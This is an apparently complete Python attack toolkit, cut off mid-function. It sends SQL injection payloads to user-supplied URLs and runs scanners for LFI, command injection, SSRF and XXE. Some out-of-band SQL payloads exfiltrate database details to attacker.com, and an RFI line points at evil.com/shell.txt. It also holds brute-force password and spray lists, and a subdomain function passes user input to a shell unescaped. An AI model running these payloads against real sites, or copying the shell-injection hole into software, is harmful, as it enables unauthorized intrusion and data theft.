#!/usr/bin/env python3
"""
Modern Penetration Testing Framework
Author: Security Professional
Version: 2.0.0
"""

import os
import sys
import subprocess
import time
import json
import requests
import threading
import queue
from datetime import datetime
from colorama import init, Fore, Style, Back
import argparse
import concurrent.futures
from pathlib import Path

# Initialize colorama
init(autoreset=True)

# Configuration
CONFIG = {
    'wordlists_dir': 'wordlists',
    'results_dir': 'results',
    'reports_dir': 'reports',
    'tools_dir': 'tools',
    'threads': 10,
    'timeout': 30
}

class PenTestFramework:
    def __init__(self):
        self.setup_directories()
        self.banner = f"""{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  {Back.RED}{Fore.WHITE}     PENETRATION TESTING TOOLS v2.0     {Back.RESET}{Fore.RED}  ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        
    def setup_directories(self):
        """Create necessary directories"""
        for dir_name in CONFIG.values():
            if isinstance(dir_name, str):
                Path(dir_name).mkdir(exist_ok=True)
    
    def display_menu(self):
        """Display main menu"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(self.banner)
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[1]{Style.RESET_ALL} {Fore.GREEN}SQL Injection Suite")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[2]{Style.RESET_ALL} {Fore.GREEN}Hidden Site Discovery")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[3]{Style.RESET_ALL} {Fore.GREEN}Advanced Bruteforce Suite")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[4]{Style.RESET_ALL} {Fore.GREEN}Vulnerability Scanner")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[5]{Style.RESET_ALL} {Fore.GREEN}Comprehensive Report")
        print(f"{Fore.YELLOW}{Style.BRIGHT}[6]{Style.RESET_ALL} {Fore.RED}Exit")
        print(f"{Fore.CYAN}{'='*60}")
        
    def run(self):
        """Main execution loop"""
        while True:
            self.display_menu()
            choice = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Select option (1-6): ")
            
            if choice == '1':
                self.sql_injection_suite()
            elif choice == '2':
                self.hidden_site_discovery()
            elif choice == '3':
                self.bruteforce_suite()
            elif choice == '4':
                self.vulnerability_scanner()
            elif choice == '5':
                self.generate_report()
            elif choice == '6':
                print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Goodbye!")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[!]{Style.RESET_ALL} Invalid choice!")

    # ========== SQL Injection Module ==========
    class SQLInjection:
        def __init__(self, target_url):
            self.target = target_url
            self.payloads = self.load_payloads()
            self.results = []
            
        def load_payloads(self):
            """Load SQL injection payloads from multiple categories"""
            payloads = {
                'error_based': self.generate_error_based_payloads(),
                'union_based': self.generate_union_payloads(),
                'blind_boolean': self.generate_blind_boolean_payloads(),
                'time_based': self.generate_time_based_payloads(),
                'out_of_band': self.generate_oob_payloads(),
                'second_order': self.generate_second_order_payloads(),
                'advanced': self.generate_advanced_payloads()
            }
            return payloads
        
        def generate_error_based_payloads(self):
            """Generate error-based SQLi payloads"""
            base = ["'", "\"", "`", "')", "\")", "`)", "'))", "\"))", "`))"]
            payloads = []
            for b in base:
                payloads.extend([
                    f"{b} AND 1=1",
                    f"{b} AND 1=2",
                    f"{b} OR 1=1",
                    f"{b} OR 1=2",
                    f"{b} AND SLEEP(5)",
                    f"{b} UNION SELECT NULL",
                    f"{b} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))",
                    f"{b} AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)",
                    f"{b} AND GTID_SUBSET(@@version,0)",
                ])
            return payloads[:50]  # Limit to 50 for example
        
        def generate_union_payloads(self):
            """Generate union-based SQLi payloads"""
            payloads = []
            for i in range(1, 11):
                nulls = ",".join(["NULL"] * i)
                payloads.extend([
                    f"' UNION SELECT {nulls}--",
                    f"\" UNION SELECT {nulls}--",
                    f"') UNION SELECT {nulls}--",
                    f"\") UNION SELECT {nulls}--",
                    f"') UNION ALL SELECT {nulls}--",
                    f" UNION SELECT {nulls} FROM information_schema.tables--",
                ])
            return payloads
        
        def generate_blind_boolean_payloads(self):
            """Generate blind boolean SQLi payloads"""
            payloads = []
            conditions = [
                "1=1", "1=2", "ASCII(SUBSTRING(@@version,1,1))>0",
                "EXISTS(SELECT * FROM information_schema.tables)",
                "(SELECT COUNT(*) FROM information_schema.tables)>0"
            ]
            for cond in conditions:
                payloads.extend([
                    f"' AND {cond}--",
                    f"' OR {cond}--",
                    f"') AND {cond}--",
                    f"' AND IF({cond},1,0)--",
                    f"' AND CASE WHEN {cond} THEN 1 ELSE 0 END--",
                ])
            return payloads
        
        def generate_time_based_payloads(self):
            """Generate time-based SQLi payloads"""
            payloads = []
            delays = [1, 2, 5, 10]
            for delay in delays:
                payloads.extend([
                    f"' AND SLEEP({delay})--",
                    f"' OR SLEEP({delay})--",
                    f"') AND SLEEP({delay})--",
                    f"' AND BENCHMARK(1000000,MD5('test'))--",
                    f"' AND IF(1=1,SLEEP({delay}),0)--",
                    f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
                ])
            return payloads
        
        def generate_oob_payloads(self):
            """Generate out-of-band SQLi payloads"""
            payloads = [
                "' AND LOAD_FILE('\\\\attacker\\share\\file')--",
                "' UNION SELECT @@version INTO OUTFILE '/tmp/version'--",
                "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\test')))--",
                "'; EXEC xp_dirtree '\\\\attacker.com\\share'--",
                "'; DECLARE @q VARCHAR(1024); SET @q = '\\\\' + @@SERVERNAME + '.attacker.com\\test'; EXEC master.dbo.xp_dirtree @q--",
            ]
            return payloads
        
        def generate_second_order_payloads(self):
            """Generate second-order SQLi payloads"""
            return [
                "admin' --",
                "admin' #",
                "admin'/*",
                "' OR '1'='1",
                "' UNION SELECT 'admin', '5f4dcc3b5aa765d61d8327deb882cf99' --",
            ]
        
        def generate_advanced_payloads(self):
            """Generate advanced technique payloads"""
            payloads = []
            # Alternative encoding
            encodings = [
                ("%27", "'"), ("%22", "\""), ("%60", "`"),
                ("%2527", "'"), ("%2522", "\""), ("%25%32%37", "'"),
                ("&#x27;", "'"), ("&#39;", "'"), ("&apos;", "'"),
                ("\\u0027", "'"), ("\\x27", "'"),
            ]
            
            for encoded, decoded in encodings:
                payloads.extend([
                    f"{encoded} OR 1=1--",
                    f"{encoded} UNION SELECT NULL--",
                    f"{encoded} AND SLEEP(5)--",
                ])
            
            # Polyglot payloads
            payloads.extend([
                "SLEEP(5) /*' OR '1'='1*/",
                "' OR 1=1/*' AND '1'='1*/",
                "'/**/OR/**/1=1--",
                "'/*!50000OR*/1=1--",
                "'||1=1--",
                "'&&1=1--",
            ])
            
            return payloads
        
        def test_payload(self, payload):
            """Test individual payload"""
            try:
                # Test in URL parameters
                test_urls = [
                    f"{self.target}?id={payload}",
                    f"{self.target}?search={payload}",
                    f"{self.target}?q={payload}",
                ]
                
                for url in test_urls:
                    try:
                        start = time.time()
                        response = requests.get(url, timeout=10, 
                                              headers={'User-Agent': 'Mozilla/5.0 (PenTest)'})
                        elapsed = time.time() - start
                        
                        # Check for indicators
                        indicators = [
                            ('error' in response.text.lower() and ('sql' in response.text.lower() or 'mysql' in response.text.lower())),
                            elapsed > 5,  # Time-based detection
                            'syntax' in response.text.lower() and 'sql' in response.text.lower(),
                            'warning' in response.text.lower() and ('mysql' in response.text.lower() or 'sql' in response.text.lower()),
                        ]
                        
                        if any(indicators):
                            result = {
                                'type': self.detect_type(payload),
                                'payload': payload,
                                'url': url,
                                'response_time': elapsed,
                                'status_code': response.status_code,
                                'length': len(response.text)
                            }
                            return result
                    except:
                        continue
                        
            except Exception as e:
                pass
            return None
        
        def detect_type(self, payload):
            """Detect SQLi type from payload"""
            payload_lower = payload.lower()
            if 'sleep' in payload_lower or 'benchmark' in payload_lower:
                return 'Time-Based'
            elif 'union' in payload_lower:
                return 'Union-Based'
            elif 'extractvalue' in payload_lower or 'updatexml' in payload_lower:
                return 'Error-Based'
            elif 'load_file' in payload_lower or 'into outfile' in payload_lower:
                return 'Out-of-Band'
            elif 'if(' in payload_lower or 'case when' in payload_lower:
                return 'Boolean-Based Blind'
            elif '%' in payload or '&#' in payload:
                return 'Alternative Encoding'
            else:
                return 'Generic'
        
        def run_comprehensive_test(self):
            """Run all SQLi tests with threading"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive SQL injection test...")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Target: {self.target}")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Loading payloads...")
            
            all_payloads = []
            for category, payload_list in self.payloads.items():
                all_payloads.extend(payload_list)
            
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Total payloads: {len(all_payloads)}")
            
            # Multi-threaded testing
            with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG['threads']) as executor:
                future_to_payload = {executor.submit(self.test_payload, p): p for p in all_payloads}
                
                for future in concurrent.futures.as_completed(future_to_payload):
                    payload = future_to_payload[future]
                    try:
                        result = future.result()
                        if result:
                            self.results.append(result)
                            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found: {result['type']} - {result['payload'][:50]}...")
                    except Exception as e:
                        continue
            
            return self.results

    def sql_injection_suite(self):
        """Main SQL injection interface"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}SQL INJECTION TESTING SUITE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}")
        
        target = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Enter target URL (e.g., http://example.com/page.php?id=1): ")
        
        if not target.startswith('http'):
            target = 'http://' + target
        
        sql_tester = self.SQLInjection(target)
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Available techniques:")
        techniques = [
            "1. Error-Based SQLi",
            "2. Union-Based SQLi",
            "3. Boolean-Based Blind SQLi",
            "4. Time-Based Blind SQLi",
            "5. Out-of-Band SQLi",
            "6. Second-Order SQLi",
            "7. Alternative Encoding",
            "8. ALL Techniques (Comprehensive)"
        ]
        
        for tech in techniques:
            print(f"   {tech}")
        
        choice = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Select technique (1-8): ")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting SQL injection test...")
        
        results = sql_tester.run_comprehensive_test()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"{CONFIG['reports_dir']}/sql_injection_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write("="*60 + "\n")
            f.write("SQL INJECTION TEST REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Test Date: {datetime.now()}\n")
            f.write(f"Total Tests: {len(results)}\n\n")
            
            for result in results:
                f.write(f"[{result['type']}]\n")
                f.write(f"Payload: {result['payload']}\n")
                f.write(f"URL: {result['url']}\n")
                f.write(f"Response Time: {result['response_time']:.2f}s\n")
                f.write(f"Status Code: {result['status_code']}\n")
                f.write(f"Response Length: {result['length']}\n")
                f.write("-"*40 + "\n")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Test completed!")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Vulnerabilities found: {len(results)}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved to: {report_file}")
        
        if results:
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Vulnerable URLs:")
            for result in results[:5]:  # Show first 5
                print(f"  - {result['url']}")
        
        input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")

    # ========== Hidden Site Discovery ==========
    def hidden_site_discovery(self):
        """Discover hidden sites and subdomains"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}HIDDEN SITE DISCOVERY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}")
        
        domain = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Enter target domain (e.g., example.com): ")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting hidden site discovery...")
        
        # Methods for discovery
        methods = [
            self.sublist3r_discovery,
            self.amass_discovery,
            self.crt_sh_discovery,
            self.dns_enumeration,
            self.virtual_host_discovery,
            self.archive_org_discovery,
            self.google_dorking,
            self.dictionary_attack,
            self.certificate_transparency,
            self.reverse_ip_lookup,
        ]
        
        all_results = set()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_method = {executor.submit(method, domain): method for method in methods}
            
            for future in concurrent.futures.as_completed(future_to_method):
                method = future_to_method[future]
                try:
                    results = future.result()
                    if results:
                        all_results.update(results)
                        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {method.__name__}: Found {len(results)} subdomains")
                except Exception as e:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} {method.__name__}: Error - {str(e)}")
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"{CONFIG['reports_dir']}/hidden_sites_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write("="*60 + "\n")
            f.write("HIDDEN SITE DISCOVERY REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Target: {domain}\n")
            f.write(f"Test Date: {datetime.now()}\n")
            f.write(f"Total Subdomains Found: {len(all_results)}\n\n")
            
            for subdomain in sorted(all_results):
                f.write(f"{subdomain}\n")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Discovery completed!")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Total subdomains found: {len(all_results)}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved to: {report_file}")
        
        if all_results:
            print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} Sample subdomains found:")
            for subdomain in list(all_results)[:10]:
                print(f"  - {subdomain}")
        
        input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")
    
    def sublist3r_discovery(self, domain):
        """Use Sublist3r for subdomain enumeration"""
        results = set()
        try:
            # Try to import and use Sublist3r if available
            import sublist3r
            subdomains = sublist3r.enumerate(domain, 40, savefile=None, 
                                           ports=None, silent=True, verbose=False, 
                                           enable_bruteforce=False, engines=None)
            results.update(subdomains)
        except ImportError:
            # Fallback to API or other methods
            pass
        return results
    
    def amass_discovery(self, domain):
        """Use Amass for subdomain enumeration"""
        results = set()
        try:
            # Try to run amass via command line
            cmd = f"amass enum -d {domain} -passive"
            output = subprocess.check_output(cmd, shell=True, text=True)
            results.update(line.strip() for line in output.split('\n') if line.strip())
        except:
            pass
        return results
    
    def crt_sh_discovery(self, domain):
        """Certificate Transparency Logs"""
        results = set()
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=10)
            data = response.json()
            for entry in data:
                name = entry.get('name_value', '')
                if domain in name:
                    results.add(name.strip())
        except:
            pass
        return results
    
    def dns_enumeration(self, domain):
        """DNS enumeration"""
        results = set()
        common_subdomains = [
            'www', 'mail', 'ftp', 'blog', 'dev', 'test', 'admin',
            'api', 'secure', 'portal', 'webmail', 'cpanel', 'whm',
            'webdisk', 'ns1', 'ns2', 'smtp', 'pop', 'imap', 'git',
            'svn', 'm', 'mobile', 'static', 'cdn', 'shop', 'store',
            'app', 'beta', 'staging', 'old', 'new', 'backup', 'demo'
        ]
        
        for sub in common_subdomains:
            results.add(f"{sub}.{domain}")
        
        return results
    
    def virtual_host_discovery(self, domain):
        """Virtual host discovery"""
        results = set()
        # Common virtual hosts patterns
        patterns = [
            f"{domain}:8080",
            f"{domain}:8443",
            f"admin.{domain}",
            f"internal.{domain}",
            f"staging.{domain}",
        ]
        results.update(patterns)
        return results
    
    def archive_org_discovery(self, domain):
        """Archive.org discovery"""
        results = set()
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey"
            response = requests.get(url, timeout=10)
            data = response.json()
            for entry in data:
                if len(entry) > 0 and domain in entry[0]:
                    results.add(entry[0])
        except:
            pass
        return results
    
    def google_dorking(self, domain):
        """Google dorking for subdomains"""
        results = set()
        dorks = [
            f"site:*.{domain}",
            f"inurl:{domain}",
            f"intext:{domain}",
        ]
        # Note: Actual Google search would require API key
        return results
    
    def dictionary_attack(self, domain):
        """Dictionary-based subdomain discovery"""
        results = set()
        wordlist = [
            # Add comprehensive wordlist here
            'admin', 'api', 'app', 'auth', 'backup', 'beta', 'blog',
            'cdn', 'cloud', 'dev', 'docs', 'download', 'ftp', 'git',
            'help', 'internal', 'mail', 'mobile', 'news', 'portal',
            'secure', 'shop', 'staging', 'status', 'store', 'test',
            'vpn', 'web', 'www', 'mx', 'ns', 'smtp', 'pop', 'imap'
        ]
        
        for word in wordlist:
            results.add(f"{word}.{domain}")
        
        return results
    
    def certificate_transparency(self, domain):
        """Certificate Transparency logs alternative"""
        return self.crt_sh_discovery(domain)
    
    def reverse_ip_lookup(self, domain):
        """Reverse IP lookup"""
        results = set()
        try:
            url = f"https://api.hackertarget.com/reverseiplookup/?q={domain}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                domains = response.text.split('\n')
                results.update(d for d in domains if d.strip())
        except:
            pass
        return results

    # ========== Bruteforce Suite ==========
    class BruteforceSuite:
        def __init__(self, target, username=None, service='http'):
            self.target = target
            self.username = username
            self.service = service
            self.results = []
            self.wordlists = self.load_wordlists()
        
        def load_wordlists(self):
            """Load wordlists for bruteforce attacks"""
            wordlists = {
                'common_passwords': self.get_common_passwords(),
                'common_users': self.get_common_users(),
                'password_spray': self.get_password_spray_list(),
                'hybrid': self.generate_hybrid_patterns(),
            }
            return wordlists
        
        def get_common_passwords(self):
            """Get common passwords list"""
            return [
                'password', '123456', 'admin', 'welcome', 'password123',
                '12345678', 'qwerty', '123456789', '12345', '1234',
                '111111', '1234567', 'dragon', '123123', 'baseball',
                'abc123', 'football', 'monkey', 'letmein', '696969',
                'shadow', 'master', '666666', 'qwertyuiop', '123321',
                'mustang', '1234567890', 'michael', '654321', 'superman',
                '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx',
                '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer',
                'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer',
                'harley', 'batman', 'andrew', 'tigger', 'sunshine',
                'iloveyou', '2000', 'charlie', 'robert', 'thomas',
                'hockey', 'ranger', 'daniel', 'starwars', 'klaster',
                '112233', 'george', 'computer', 'michelle', 'jessica',
                'pepper', '1111', 'zxcvbn', '555555', '11111111',
                '131313', 'freedom', '777777', 'pass', 'maggie',
                '159753', 'aaaaaa', 'ginger', 'princess', 'joshua',
                'cheese', 'amanda', 'summer', 'love', 'ashley',
                'nicole', 'chelsea', 'biteme', 'matthew', 'access',
                'yankees', '987654321', 'dallas', 'austin', 'thunder',
                'taylor', 'matrix', 'minecraft'
            ]
        
        def get_common_users(self):
            """Get common username list"""
            return [
                'admin', 'administrator', 'root', 'user', 'test',
                'guest', 'info', 'webmaster', 'support', 'sysadmin',
                'manager', 'operator', 'service', 'backup', 'demo'
            ]
        
        def get_password_spray_list(self):
            """Get passwords for spraying"""
            return [
                'Spring2024!', 'Summer2024!', 'Winter2024!', 'Fall2024!',
                'Company123!', 'Welcome123!', 'Password123!', 'Changeme123!',
                'P@ssw0rd', 'P@ssw0rd123', 'Admin123!', 'User123!',
                'Secret123!', 'Qwerty123!', 'Abc123!', '123456Aa!'
            ]
        
        def generate_hybrid_patterns(self):
            """Generate hybrid attack patterns"""
            patterns = []
            base_words = ['password', 'admin', 'user', 'welcome', 'company']
            suffixes = ['123', '123!', '2024', '2024!', '@123', '#123']
            prefixes = ['!', '@', '#', '$', 'Admin', 'User']
            
            for word in base_words:
                for suffix in suffixes:
                    patterns.append(word + suffix)
                for prefix in prefixes:
                    patterns.append(prefix + word)
            
            return patterns
        
        def dictionary_attack(self):
            """Dictionary-based attack"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running dictionary attack...")
            
            for password in self.wordlists['common_passwords']:
                if self.test_credentials(self.username, password):
                    self.results.append({
                        'type': 'Dictionary',
                        'username': self.username,
                        'password': password,
                        'service': self.service
                    })
                    break
        
        def credential_stuffing(self):
            """Credential stuffing attack"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running credential stuffing...")
            
            # Common credential pairs
            credentials = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('root', 'root'),
                ('administrator', 'administrator'),
                ('guest', 'guest'),
                ('test', 'test'),
                ('user', 'user'),
            ]
            
            for username, password in credentials:
                if self.test_credentials(username, password):
                    self.results.append({
                        'type': 'Credential Stuffing',
                        'username': username,
                        'password': password,
                        'service': self.service
                    })
        
        def password_spraying(self):
            """Password spraying attack"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running password spraying...")
            
            for user in self.wordlists['common_users']:
                for password in self.wordlists['password_spray']:
                    if self.test_credentials(user, password):
                        self.results.append({
                            'type': 'Password Spraying',
                            'username': user,
                            'password': password,
                            'service': self.service
                        })
                        break
        
        def hybrid_attack(self):
            """Hybrid attack"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Running hybrid attack...")
            
            for pattern in self.wordlists['hybrid']:
                if self.test_credentials(self.username, pattern):
                    self.results.append({
                        'type': 'Hybrid',
                        'username': self.username,
                        'password': pattern,
                        'service': self.service
                    })
                    break
        
        def offline_attack_simulation(self):
            """Simulate offline attacks (hash cracking patterns)"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Simulating offline attacks...")
            
            # This would typically involve hash cracking
            # For demonstration, we'll just show the patterns
            
            hash_patterns = [
                'md5 cracking patterns',
                'sha1 patterns',
                'ntlm patterns',
                'bcrypt patterns'
            ]
            
            return hash_patterns
        
        def test_credentials(self, username, password):
            """Test credentials against target (simulated for demo)"""
            # In real implementation, this would make actual login attempts
            # For demo purposes, we'll simulate with a simple check
            
            # Simulate success for demonstration
            simulation_success = False
            
            # In real usage, you would make actual HTTP requests here
            # Example for HTTP basic auth:
            # try:
            #     response = requests.get(self.target, auth=(username, password), timeout=5)
            #     if response.status_code == 200:
            #         return True
            # except:
            #     pass
            
            # For demo, return False or simulate based on certain conditions
            return simulation_success
        
        def run_comprehensive_attack(self):
            """Run all bruteforce techniques"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Starting comprehensive bruteforce attack...")
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Target: {self.target}")
            
            attacks = [
                self.dictionary_attack,
                self.credential_stuffing,
                self.password_spraying,
                self.hybrid_attack,
            ]
            
            for attack in attacks:
                attack()
            
            offline_patterns = self.offline_attack_simulation()
            
            return self.results, offline_patterns

    def bruteforce_suite(self):
        """Main bruteforce interface"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}ADVANCED BRUTEFORCE SUITE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"\n{Fore.YELLOW}[!]{Style.RESET_ALL} WARNING: Use only on authorized systems!")
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} Legal authorization is required!\n")
        
        target = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter target URL or IP: ")
        service = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter service (http/ftp/ssh): ").lower()
        username = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter username (or press Enter for auto): ")
        
        if not username:
            username = None
        
        confirm = input(f"\n{Fore.RED}[?]{Style.RESET_ALL} Confirm attack on {target}? (y/n): ")
        if confirm.lower() != 'y':
            print(f"{Fore.YELLOW}[*]{Style.RESET_ALL} Attack cancelled.")
            return
        
        bruteforce = self.BruteforceSuite(target, username, service)
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Available attack methods:")
        methods = [
            "1. Dictionary Attack",
            "2. Credential Stuffing",
            "3. Password Spraying",
            "4. Hybrid Attack",
            "5. Offline Attack Simulation",
            "6. ALL Methods (Comprehensive)"
        ]
        
        for method in methods:
            print(f"   {method}")
        
        choice = input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Select method (1-6): ")
        
        print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Starting bruteforce attack...")
        
        results, offline_patterns = bruteforce.run_comprehensive_attack()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"{CONFIG['reports_dir']}/bruteforce_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write("="*60 + "\n")
            f.write("BRUTEFORCE ATTACK REPORT\n")
            f.write("="*60 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Service: {service}\n")
            f.write(f"Test Date: {datetime.now()}\n")
            f.write(f"Username Provided: {username if username else 'Auto-generated'}\n\n")
            
            f.write("CREDENTIALS FOUND:\n")
            f.write("-"*40 + "\n")
            if results:
                for result in results:
                    f.write(f"Type: {result['type']}\n")
                    f.write(f"Username: {result['username']}\n")
                    f.write(f"Password: {result['password']}\n")
                    f.write(f"Service: {result['service']}\n")
                    f.write("-"*40 + "\n")
            else:
                f.write("No credentials found.\n\n")
            
            f.write("\nOFFLINE ATTACK PATTERNS:\n")
            f.write("-"*40 + "\n")
            for pattern in offline_patterns:
                f.write(f"{pattern}\n")
        
        print(f"\n{Fore.GREEN}[+]{Style.RESET_ALL} Attack completed!")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Credentials found: {len(results)}")
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Report saved to: {report_file}")
        
        input(f"\n{Fore.YELLOW}[?]{Style.RESET_ALL} Press Enter to continue...")

    # ========== Vulnerability Scanner ==========
    class VulnerabilityScanner:
        def __init__(self, target_url):
            self.target = target_url
            self.vulnerabilities = []
            self.scan_results = {}
        
        def check_common_vulnerabilities(self):
            """Check for common web vulnerabilities"""
            print(f"{Fore.CYAN}[*]{Style.RESET_ALL} Scanning for common vulnerabilities...")
            
            checks = [
                self.check_sql_injection,
                self.check_xss,
                self.check_lfi,
                self.check_rfi,
                self.check_command_injection,
                self.check_file_upload,
                self.check_xxe,
                self.check_ssrf,
                self.check_idor,
                self.check_cors,
                self.check_security_headers,
                self.check_ssl_tls,
                self.check_directory_listing,
                self.check_backup_files,
                self.check_debug_pages,
            ]
            
            for check in checks:
                try:
                    check()
                except Exception as e:
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} Check failed: {str(e)}")
        
        def check_sql_injection(self):
            """Check for SQL injection vulnerabilities"""
            test_params = ['id', 'page', 'category', 'search', 'user']
            for param in test_params:
                test_url = f"{self.target}?{param}=1'"
                try:
                    response = requests.get(test_url, timeout=5)
                    if any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'oracle']):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'High'
                        })
                except:
                    pass
        
        def check_xss(self):
            """Check for XSS vulnerabilities"""
            test_payload = "<script>alert('XSS')</script>"
            test_params = ['q', 'search', 'query', 'name', 'message']
            for param in test_params:
                test_url = f"{self.target}?{param}={test_payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if test_payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'XSS',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'Medium'
                        })
                except:
                    pass
        
        def check_lfi(self):
            """Check for Local File Inclusion"""
            test_payloads = [
                '../../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '....//....//....//etc/passwd'
            ]
            for payload in test_payloads:
                test_url = f"{self.target}?page={payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if 'root:' in response.text or '[fonts]' in response.text:
                        self.vulnerabilities.append({
                            'type': 'LFI',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'High'
                        })
                except:
                    pass
        
        def check_rfi(self):
            """Check for Remote File Inclusion"""
            test_payload = 'http://evil.com/shell.txt'
            test_url = f"{self.target}?page={test_payload}"
            # This would need actual verification
            pass
        
        def check_command_injection(self):
            """Check for command injection"""
            test_payloads = [';ls', '|dir', '`whoami`', '$(id)']
            for payload in test_payloads:
                test_url = f"{self.target}?cmd={payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    if any(term in response.text.lower() for term in ['root', 'uid', 'directory', 'volume']):
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': test_url,
                            'payload': payload,
                            'severity': 'Critical'
                        })
                except:
                    pass
        
        def check_file_upload(self):
            """Check for file upload vulnerabilities"""
            # This would require actual file upload testing
            pass
        
        def check_xxe(self):
            """Check for XXE vulnerabilities"""
            xxe_payload = '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
            <root>&test;</root>'''
            # This would require POST request with XML
            pass
        
        def check_ssrf(self):
            """Check for SSRF vulnerabilities"""
            test_payloads = [
                'http://169.254.169.254/latest/meta-data/',
                'http://localhost:22',
                'http://127.0.0.1:3306'
            ]
            for payload in test_payloads:
                test_url = f"{self.target}?url={payload}"
                # This would require monitoring for callbacks
                pass
        
        def check_idor(self):
            """Check for IDOR vulnerabilities"""
            test_urls = [
                f"{self.target}/user/1",
                f"{self.target}/profile/1",
                f"{self.target}/order/1"
            ]
            for url in test_urls:
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        self.vulnerabilities.append({
                            'type': 'Possible IDOR',
                            'url': url,
                            'severity': 'Medium'
                        })
                except:
                    pass
        
        def check_cors(self):
